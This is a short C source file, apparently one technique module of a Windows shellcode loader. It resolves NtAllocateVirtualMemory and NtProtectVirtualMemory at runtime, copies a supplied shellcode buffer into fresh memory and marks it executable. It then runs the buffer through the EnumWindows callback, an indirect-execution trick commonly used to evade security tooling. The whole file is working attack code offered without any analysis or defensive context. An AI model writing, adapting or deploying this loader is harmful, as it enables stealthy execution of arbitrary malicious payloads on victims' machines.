#include "../dispatch.h"
#include "../ntapi.h"

static BOOL CALLBACK enum_cb(HWND hwnd, LPARAM lParam) {
    (void)hwnd;
    ((void (*)(void))lParam)();
    return FALSE;
}

BOOL tech_nt_callback(unsigned char *sc, size_t len) {
    fnNtAllocateVirtualMemory pAlloc =
        (fnNtAllocateVirtualMemory)ntapi_resolve("NtAllocateVirtualMemory");
    fnNtProtectVirtualMemory pProtect =
        (fnNtProtectVirtualMemory)ntapi_resolve("NtProtectVirtualMemory");
    if (!pAlloc || !pProtect) return FALSE;

    PVOID base = NULL;
    SIZE_T sz = len;
    if (!NT_SUCCESS(pAlloc((HANDLE)-1, &base, 0, &sz,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        return FALSE;

    memcpy(base, sc, len);

    ULONG old = 0;
    sz = len;
    pProtect((HANDLE)-1, &base, &sz, PAGE_EXECUTE_READ, &old);

    EnumWindows(enum_cb, (LPARAM)base);
    return TRUE;
}
